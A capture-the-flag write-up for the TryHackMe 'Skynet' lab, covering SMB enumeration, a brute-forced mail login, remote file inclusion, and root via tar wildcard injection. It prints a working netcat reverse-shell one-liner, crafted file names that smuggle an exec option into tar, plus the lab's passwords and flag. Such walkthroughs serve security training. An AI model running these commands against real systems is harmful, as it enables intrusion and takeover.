# Writeup for [Skynet](https://tryhackme.com/room/skynet)

```
set -gx IP 10.10.231.11
```


## Task 1: Deploy and compromise the vulnerable machine!

* default nmap scan `nmap -sV -A -Pn -oN nmap/initial $IP`
* nmap scan with vuln scripts `nmap -sV -A -Pn --script vuln -oN nmap/initial $IP`
* using smbclient to connect to anonymous share `smbclient \\$IP\anonymous`
* downloading all files with `get important.txt` and `mget ./logs/*`


### What is Miles password for his emails?

* wrote script for bruteforcing squirrelmail login `python ./squirrel.py`
* found password **cyborg007haloterminator**


### What is the hidden directory?

* connect with found credentials `smbclient --username milesdyson --password ")s{A&2Z=F^n_E.B<back-tick>" \\$IP\milesdyson`
* found **important.txt** in **notes** folder
* found beta CMS at route **/45kra24zxs28v3yd**


### What is the vulnerability called when you can include a remote file for malicious purposes?

> Remote File Inclusion


### What is the user flag?

* run gobuster on newly found page `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://$IP/45kra24zxs28v3yd/`
* found **/administrator** route
* found exploit [here](https://www.exploit-db.com/exploits/25971)
* start nc listener and local http server to download & execute php-reverse-shell
* print out user.txt in /home/milesdyson


### What is the root flag?

* tryout privilege escalation
* read crontab file `cat /etc/crontab`
* create shell.sh in /var/www/html
* execute shell.sh in checkpoint-action from tar command
* start netcat listener `nc -lnvp 4444`
* ```
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.60.141 4444 >/tmp/f" > shell.sh
  touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
  touch "/var/www/html/--checkpoint=1"
  ```
* got root shell and found root.txt **3f0372db24753accc7179a282cd6a949**
